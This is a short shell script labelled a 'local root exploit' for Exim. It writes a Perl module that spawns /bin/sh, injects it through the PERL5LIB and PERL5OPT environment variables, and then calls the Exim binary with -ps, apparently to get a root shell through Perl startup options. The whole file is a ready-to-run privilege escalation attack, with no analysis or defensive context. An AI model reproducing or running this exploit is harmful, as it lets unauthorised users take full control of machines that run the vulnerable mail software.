#!/bin/sh
# local root exploit
# ===============================================


echo "[local root exploit]"

# Create a temporary directory for the exploit
exploit_dir=$(mktemp -d)
exploit_file="${exploit_dir}/root.pm"

# Create the Perl module file
cat > "${exploit_file}" << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF

# Set the Perl environment variables
export PERL5LIB="${exploit_dir}"
export PERL5OPT="-Mroot"

# Execute Exim with the manipulated Perl environment
/usr/exim/bin/exim -ps

# Clean up the temporary directory
rm -rf "${exploit_dir}"
